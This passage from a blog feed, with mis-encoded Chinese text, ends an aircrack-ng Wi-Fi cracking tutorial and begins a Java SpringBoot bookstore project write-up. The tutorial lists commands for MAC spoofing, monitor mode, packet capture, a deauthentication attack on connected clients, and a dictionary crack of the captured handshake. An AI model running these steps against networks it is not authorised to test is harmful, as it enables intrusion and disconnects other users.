wordlist.txt thekai-01.cap</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps67.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps67.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><h3 id="ï¼ˆå…­ï¼‰-ifconfigï¼šç”¨äºæŸ¥çœ‹å’Œä¿®æ”¹ç½‘å¡çŠ¶æ€"><a href="#ï¼ˆå…­ï¼‰-ifconfigï¼šç”¨äºæŸ¥çœ‹å’Œä¿®æ”¹ç½‘å¡çŠ¶æ€" class="headerlink" title="ï¼ˆå…­ï¼‰ ifconfigï¼šç”¨äºæŸ¥çœ‹å’Œä¿®æ”¹ç½‘å¡çŠ¶æ€"></a>ï¼ˆå…­ï¼‰ ifconfigï¼šç”¨äºæŸ¥çœ‹å’Œä¿®æ”¹ç½‘å¡çŠ¶æ€</h3><h4 id="1ã€è¯­æ³•æ ¼å¼-4"><a href="#1ã€è¯­æ³•æ ¼å¼-4" class="headerlink" title="1ã€è¯­æ³•æ ¼å¼"></a>1ã€è¯­æ³•æ ¼å¼</h4><p>ã€è¯­æ³•ã€‘ifconfig [-a] [-s] [interface] [down|up] </p><p>-aï¼šåˆ—å‡ºè¿æ¥åˆ°å½“å‰ç³»ç»Ÿçš„æ‰€æœ‰æ¥å£è¯¦ç»†ä¿¡æ¯ </p><p>-sï¼šåˆ—å‡ºæ‰€æœ‰å¯ç”¨æ¥å£ </p><p>interfaceï¼šæ¥å£ç›¸å…³å‚æ•° </p><p>downï¼šå…³é—­æŒ‡å®šç½‘å¡ </p><p>upï¼šæ¿€æ´»æŒ‡å®šç½‘å¡ </p><h4 id="2ã€ä½¿ç”¨ç¤ºä¾‹-4"><a href="#2ã€ä½¿ç”¨ç¤ºä¾‹-4" class="headerlink" title="2ã€ä½¿ç”¨ç¤ºä¾‹"></a>2ã€ä½¿ç”¨ç¤ºä¾‹</h4><p>ï¼ˆ1ï¼‰æŸ¥çœ‹æœ¬æœºæ¥å£ä¿¡æ¯</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps68.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps68.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p>ï¼ˆ2ï¼‰åˆ—å‡ºæ‰€æœ‰å¯ç”¨æ¥å£</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps69.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps69.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p>ï¼ˆ3ï¼‰å…³é—­æŒ‡å®šç½‘å¡</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps70.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps70.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps71.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps71.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p>ï¼ˆ4ï¼‰æ¿€æ´»æŒ‡å®šç½‘å¡</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps72.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps72.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><h3 id="ï¼ˆä¸ƒï¼‰-macchangerï¼šä¼ªé€ -MAC-åœ°å€"><a href="#ï¼ˆä¸ƒï¼‰-macchangerï¼šä¼ªé€ -MAC-åœ°å€" class="headerlink" title="ï¼ˆä¸ƒï¼‰ macchangerï¼šä¼ªé€  MAC åœ°å€"></a>ï¼ˆä¸ƒï¼‰ macchangerï¼šä¼ªé€  MAC åœ°å€</h3><h4 id="1ã€è¯­æ³•æ ¼å¼-5"><a href="#1ã€è¯­æ³•æ ¼å¼-5" class="headerlink" title="1ã€è¯­æ³•æ ¼å¼"></a>1ã€è¯­æ³•æ ¼å¼</h4><p>ã€è¯­æ³•ã€‘macchanger [option] device </p><p>-aï¼šä¼ªé€ ä¸€ä¸ªåŒå‚çš„åŒç±»å‹éšæœº MAC åœ°å€ </p><p>-Aï¼šä¼ªé€ ä¸€ä¸ªä¸åŒå‚å•†ä¸åŒç±»å‹çš„ MAC åœ°å€ </p><p>-eï¼šä¼ªé€ ä¸€ä¸ªåŒå‚çš„éšæœº MAC åœ°å€ </p><p>-s,â€“showï¼šæ‰“å°å½“å‰çš„ MACã€‚ å½“æœªæŒ‡å®šå…¶ä»–é€‰é¡¹æ—¶ï¼Œè¿™æ˜¯é»˜è®¤æ“ä½œã€‚ </p><p>-r,â€“randomï¼šè®¾ç½®å®Œå…¨éšæœºçš„ MACã€‚ </p><p>-m xx:xx:xx:xx:xx:xx </p><p>â€“mac&#x3D;xx:xx:xx:xx:xx:xx ä¿®æ”¹ä¸ºæŒ‡å®šçš„ mac åœ°å€ </p><p>-p,â€“permanentï¼šå°† MAC åœ°å€é‡ç½®ä¸ºå…¶åŸå§‹çš„æ°¸ä¹…ç¡¬ä»¶å€¼ </p><h4 id="2ã€ä½¿ç”¨ç¤ºä¾‹-5"><a href="#2ã€ä½¿ç”¨ç¤ºä¾‹-5" class="headerlink" title="2ã€ä½¿ç”¨ç¤ºä¾‹"></a>2ã€ä½¿ç”¨ç¤ºä¾‹</h4><p>ï¼ˆ1ï¼‰ä¼ªé€ ä¸€ä¸ªåŒå‚çš„åŒç±»å‹éšæœº MAC åœ°å€ã€‚æ³¨æ„ï¼šè‹¥ç½‘å¡ä¸ºæ¿€æ´»çŠ¶æ€ï¼Œåˆ™æ— æ³•ä¿®æ”¹ MAC åœ°å€ï¼Œä¼šæ˜¾ç¤ºè®¾å¤‡å¿™ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps73.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps73.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p>ï¼ˆ2ï¼‰ä¼ªé€ ä¸€ä¸ªä¸åŒå‚å•†ä¸åŒç±»å‹çš„ MAC åœ°å€</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps74.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps74.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p>ï¼ˆ3ï¼‰ä¼ªé€ ä¸€ä¸ªåŒå‚çš„éšæœº MAC åœ°å€</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps75.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps75.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p>ï¼ˆ4ï¼‰ä¿®æ”¹ä¸ºæŒ‡å®šçš„ MAC åœ°å€ </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps76.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps76.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps77.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps77.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p>ï¼ˆ5ï¼‰å–æ¶ˆä¼ªé€ çš„ MAC åœ°å€</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps78.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps78.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps79.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps79.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><h3 id="ï¼ˆå…«ï¼‰-iwconfigï¼šé…ç½®æ— çº¿ç½‘ç»œè®¾å¤‡æˆ–æ˜¾ç¤ºæ— çº¿ç½‘ç»œè®¾å¤‡ä¿¡æ¯"><a href="#ï¼ˆå…«ï¼‰-iwconfigï¼šé…ç½®æ— çº¿ç½‘ç»œè®¾å¤‡æˆ–æ˜¾ç¤ºæ— çº¿ç½‘ç»œè®¾å¤‡ä¿¡æ¯" class="headerlink" title="ï¼ˆå…«ï¼‰ iwconfigï¼šé…ç½®æ— çº¿ç½‘ç»œè®¾å¤‡æˆ–æ˜¾ç¤ºæ— çº¿ç½‘ç»œè®¾å¤‡ä¿¡æ¯"></a>ï¼ˆå…«ï¼‰ iwconfigï¼šé…ç½®æ— çº¿ç½‘ç»œè®¾å¤‡æˆ–æ˜¾ç¤ºæ— çº¿ç½‘ç»œè®¾å¤‡ä¿¡æ¯</h3><h4 id="1ã€è¯­æ³•æ ¼å¼-6"><a href="#1ã€è¯­æ³•æ ¼å¼-6" class="headerlink" title="1ã€è¯­æ³•æ ¼å¼"></a>1ã€è¯­æ³•æ ¼å¼</h4><p>ã€è¯­æ³•ã€‘iwconfig [interface] [option] </p><p>auto:è‡ªåŠ¨æ¨¡å¼ </p><p>essid:è®¾ç½® ESSID </p><p>nwid:è®¾ç½®ç½‘ç»œ ID </p><p>freq:è®¾ç½®æ— çº¿ç½‘ç»œé€šä¿¡é¢‘æ®µ </p><p>chanel:è®¾ç½®æ— çº¿ç½‘ç»œé€šä¿¡é¢‘æ®µ </p><p>sens:è®¾ç½®æ— çº¿ç½‘ç»œè®¾å¤‡çš„æ„ŸçŸ¥é˜€å€¼ </p><p>mode:è®¾ç½®æ— çº¿ç½‘ç»œè®¾å¤‡çš„é€šä¿¡è®¾å¤‡ </p><p>ap:å¼ºè¿«æ— çº¿ç½‘å¡å‘ç»™å®šåœ°å€çš„æ¥å…¥ç‚¹æ³¨å†Œ </p><p>nick &lt;åå­—&gt;ï¼šä¸ºç½‘å¡è®¾å®šåˆ«å </p><p>rate &lt;é€Ÿç‡&gt;ï¼šè®¾å®šæ— çº¿ç½‘å¡çš„é€Ÿç‡ </p><p>rts &lt;é˜€å€¼&gt;ï¼šåœ¨ä¼ è¾“æ•°æ®åŒ…ä¹‹å‰å¢åŠ ä¸€æ¬¡æ¡æ‰‹ï¼Œç¡®ä¿¡ä¿¡é“åœ¨æ­£å¸¸çš„ </p><p>powerï¼šæ— çº¿ç½‘å¡çš„åŠŸç‡è®¾ç½® </p><h4 id="2ã€ä½¿ç”¨ç¤ºä¾‹-6"><a href="#2ã€ä½¿ç”¨ç¤ºä¾‹-6" class="headerlink" title="2ã€ä½¿ç”¨ç¤ºä¾‹"></a>2ã€ä½¿ç”¨ç¤ºä¾‹</h4><p>ï¼ˆ1ï¼‰æŸ¥çœ‹æ— çº¿ç½‘å¡ä¿¡æ¯</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps80.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps80.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p>ï¼ˆ2ï¼‰è®¾å¤‡æ— çº¿ç½‘å¡å·¥ä½œæ¨¡å¼ä¸º monitorã€‚æ³¨æ„ï¼šè‹¥ç½‘å¡åœ¨æ¿€æ´»çŠ¶æ€ï¼Œåˆ™ä¼šæ˜¾ç¤ºè®¾å¤‡ç¹å¿™</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps81.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps81.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps82.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps82.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p>ä¸‰ã€aircrack-ng Wifi å¯†ç ç ´è§£åŸºæœ¬æ­¥éª¤ </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps83.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps83.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p>å››ã€Wifi å¯†ç ç ´è§£å®ä¾‹ </p><p>1ã€Down æ‰ç½‘å¡ï¼šifconfig wlan0 down</p><p>2ã€ä¼ªé€  MAC åœ°å€ï¼šmacchanger â€“e wlan0 </p><p>3ã€æ¿€æ´»ç½‘å¡ï¼šifconfig wlan0 up </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps84.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps84.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p>4ã€è®¾ç½®ç›‘å¬æ¨¡å¼ </p><p>ï¼ˆ1ï¼‰ç»“æŸå ç”¨æ— çº¿ç½‘å¡çš„è¿›ç¨‹ï¼šairmon-ng check kill </p><p>ï¼ˆ2ï¼‰å¼€å¯æ— çº¿ç½‘å¡ç›‘å¬æ¨¡å¼ï¼šairmon-ng start wlan0 </p><p>ï¼ˆ3ï¼‰æŸ¥çœ‹æ— çº¿ç½‘å¡çŠ¶æ€ï¼šiwconfig</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps85.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps85.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p>5ã€æ¢æµ‹ç½‘ç»œï¼ŒæŸ¥çœ‹å‘¨å›´ Wifi ä¿¡æ¯ï¼šairodump-ng wlan0mon</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps86.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps86.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p>6ã€ç›‘å¬æŠ“åŒ…ï¼šairodump-ng â€“ivs â€“bssid AP_MAC â€“w hack wlan0mon </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps87.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps87.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p>7ã€æ”»å‡»ç½‘ç»œï¼ˆéœ€æ–°å¼€ä¸€ä¸ªç»ˆç«¯ï¼‰ï¼šaireplay-ng -0 1 â€“a AP_Mac â€“c Client_Mac wlan0mon </p><p>åœ¨ç›‘å¬æŠ“åŒ…æ—¶ï¼Œéœ€è¦è¦æ±‚æŒ‡å®šçš„ AP æœ‰æ­£åœ¨è¿›è¡Œè¿æ¥è®¤è¯çš„å®¢æˆ·ç«¯ä»¥è·å–æ¡æ‰‹åŒ…ï¼Œè‹¥æ— æ­£åœ¨è®¤è¯å®¢æˆ·ç«¯ï¼Œå°†ä¼šå¯¼è‡´é•¿æ—¶é—´æ— æ³•æŠ“åŒ…æˆåŠŸï¼Œè¿™æ—¶å¯ä»¥äººä¸ºçš„å°†å·²ç»è¿æ¥çš„å®¢æˆ·å¼ºåˆ¶æ–­å¼€ã€‚å› ä¸ºåœ¨è¿æ¥ Wifi æ—¶ä¸€èˆ¬éƒ½é€‰æ‹©äº†è‡ªåŠ¨è¿æ¥ï¼Œæ‰€ä»¥ä¸€æ—¦æ–­å¼€ï¼Œå®¢æˆ·ç«¯å°†ä¼šç«‹å³é‡æ–°è¿æ¥ï¼Œæ­¤æ—¶å°±å¯ä»¥æ•è·åˆ°æ¡æ‰‹åŒ…ã€‚è‹¥ä¸€æ¬¡ä¸æˆåŠŸï¼Œåˆ™å¯ä»¥å¤šæ”»å‡»å‡ æ¬¡ï¼Œä½†æ”»å‡»æ¬¡æ•°è¿‡å¤šæœ‰å¯èƒ½å¼•èµ·ç›®æ ‡ AP è­¦è§‰ï¼Œä¸¥é‡æ—¶å¯å¯¼è‡´ AP æ­»æœºã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps88.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps88.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps89.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps89.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps90.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps90.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p><p>8ã€ç ´è§£å¯†ç ï¼šaircrack-ng â€“w wordlist.txt thakai-05.ivs</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps91.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps91.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"> </p>]]></content>
      
      
      <categories>
          
          <category> æ‚ä¸ƒæ‚å…« </category>
          
      </categories>
      
      
        <tags>
            
            <tag> aircrack-ng </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaä¹¦åŸå…¨å¼€å‘æµç¨‹</title>
      <link href="/2023/05/20/java-shu-cheng-kai-fa-quan-liu-cheng/"/>
      <url>/2023/05/20/java-shu-cheng-kai-fa-quan-liu-cheng/</url>
      
        <content type="html"><![CDATA[<p>æºç åŠç­”è¾©è®ºæ–‡ï¼š<a href="https://github.com/godownio/anzfloor">https://github.com/godownio/anzfloor</a></p><p>ä½¿ç”¨æ—¶è¯·æ›´æ”¹é…ç½®æ–‡ä»¶æ•°æ®åº“è´¦å·ä¸å¯†ç ï¼Œå¹¶å¯¼å…¥SQL</p><h2 id="æ¡†æ¶å›¾"><a href="#æ¡†æ¶å›¾" class="headerlink" title="æ¡†æ¶å›¾"></a>æ¡†æ¶å›¾</h2><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps1.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps1.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><table><thead><tr><th>èµ„æºéœ€æ±‚åˆ†æ</th><th></th><th></th></tr></thead><tbody><tr><td>ç¡¬ä»¶èµ„æº</td><td>CPU</td><td>lntel(R) Core(TM) i7-1065G7 CPU @1.30GHz</td></tr><tr><td></td><td>æ˜¾å¡</td><td>lntel(R)lris(R)Plus Graphics</td></tr><tr><td></td><td>å†…å­˜</td><td>DDR4 2*8GB</td></tr><tr><td>è½¯ä»¶èµ„æº</td><td>ç³»ç»Ÿåå°å¼€å‘å·¥å…·</td><td>OpenJDK1.8.0_201</td></tr><tr><td></td><td></td><td>IDEA2022.2.3</td></tr><tr><td></td><td>Webåº”ç”¨æœåŠ¡å™¨</td><td>Tomcat-8.5.47</td></tr><tr><td></td><td>æ•°æ®åº“æœåŠ¡å™¨</td><td>Mysql-8.0.33</td></tr><tr><td></td><td>å‰ç«¯æŠ€æœ¯</td><td>HTMLã€CSSã€JavaScriptã€bootstrapã€themleaf</td></tr><tr><td></td><td>åç«¯æŠ€æœ¯</td><td>SpringBootã€mybatis-plusã€Java</td></tr><tr><td></td><td>æµ‹è¯•æµè§ˆå™¨</td><td>Chromeã€FireFox</td></tr></tbody></table><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps2.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps2.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps3.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps3.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps4.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps4.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="è®¾è®¡æ•ˆæœå›¾"><a href="#è®¾è®¡æ•ˆæœå›¾" class="headerlink" title="è®¾è®¡æ•ˆæœå›¾"></a>è®¾è®¡æ•ˆæœå›¾</h2><p>é¦–é¡µï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps5.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps5.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å›¾ä¹¦åˆ†ç±»å±•ç¤ºé¡µï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps6.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps6.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç™»å½•æ¨¡æ€æ¡†ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps6.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps6.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ³¨å†Œæ¨¡æ€æ¡†ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps7.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps7.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å›¾ä¹¦è¯¦æƒ…é¡µï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps8.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps8.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æˆ‘çš„è´­ç‰©è½¦é¡µï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps9.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps9.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç¡®è®¤è®¢å•ç•Œé¢åŠæ·»åŠ æ”¶è´§åœ°å€æ¨¡æ€æ¡†</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps10.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps10.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å†å²è®¢å•é¡µï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps11.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/wps11.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h1 id="å®‰çŸ¥æ¥¼"><a href="#å®‰çŸ¥æ¥¼" class="headerlink" title="å®‰çŸ¥æ¥¼"></a>å®‰çŸ¥æ¥¼</h1><h2 id="æ•°æ®åº“åŠmybatis-CRUD"><a href="#æ•°æ®åº“åŠmybatis-CRUD" class="headerlink" title="æ•°æ®åº“åŠmybatis CRUD"></a>æ•°æ®åº“åŠmybatis CRUD</h2><p>1.å…ˆæŠŠæ•°æ®åº“åˆ¶ä½œå¥½ï¼Œè¿™é‡Œç”¨çš„navicat</p><p>è¡¨çš„ç»“æ„å¦‚ä¸‹ï¼š</p><ul><li>bs_userä¸ºç”¨æˆ·ä¿¡æ¯ï¼Œbs_bookä¸ºä¹¦ç±ä¿¡æ¯ï¼Œbs_cartä¸ºè´­ç‰©è½¦ä¿¡æ¯ï¼Œbs_addrä¸ºç”¨æˆ·åœ°å€</li><li>bs_order_itemä¸ºè®¢å•ç»“ç®—ä¿¡æ¯å±•ç¤ºï¼Œbs_orderä¸ºå†å²è®¢å•ä¿¡æ¯<img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230425155127713.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230425155127713.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></li></ul><p>entityä¸‹å®šä¹‰äº†å®ä½“ç±»</p><ul><li>å¦‚Bookå®ä½“ç±»ï¼Œå¯¹åº”äº†æ•°æ®åº“çš„bs_bookï¼Œæ¯ä¸ªå­—æ®µå¯¹åº”å£°æ˜ï¼Œç”¨lombokçš„@Dataæ³¨è§£è‡ªåŠ¨ç”Ÿæˆsetter,getter,toString</li><li>ä½¿ç”¨mybatis-plusçš„@TableNameæ³¨è§£å£°æ˜å®ä½“ç±»å¯¹åº”çš„æ•°æ®è¡¨ï¼Œä½¿ç”¨mybatiså£°æ˜çš„ç±»è¿˜éœ€è¦ç»§æ‰¿com.baomidou.mybatisplus.extension.activerecord.Modelï¼Œ&lt;å®ä½“ç±»&gt;å¡«ç±»åBook</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230425160942239.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230425160942239.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230425160329859.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230425160329859.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>æ•°æ®è¡¨çš„ä¸»é”®ï¼ˆbs_booké‡ŒæŒ‡idï¼‰éœ€è¦ç”¨@TableIdæ³¨è§£</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230425160416173.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230425160416173.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230425160438850.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230425160438850.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿™é‡Œcategoryå­—æ®µæˆ‘æƒ³åšåˆ°çš„æ•ˆæœæ˜¯å¯¹å›¾ä¹¦åˆ†ä¸ºç²¾é€‰ï¼Œæ¨èå’Œç‰¹ä»·ï¼Œæ‰€ä»¥åšäº†mybatisçš„æšä¸¾å®šä¹‰</p><p>åç»­å¯¹å®ä½“ç±»è¿›è¡ŒCRUDæ“ä½œéœ€è¦ç»§æ‰¿Mapperæ¥å£ï¼Œè¿™é‡Œåœ¨mapperåŒ…ä¸‹å®šä¹‰BookMapper</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230425171758792.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230425171758792.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å®šä¹‰å›¾ä¹¦ä¸šåŠ¡å±‚çš„BookServiceåªéœ€è¦ç»§æ‰¿ServiceImplç„¶ååŠ 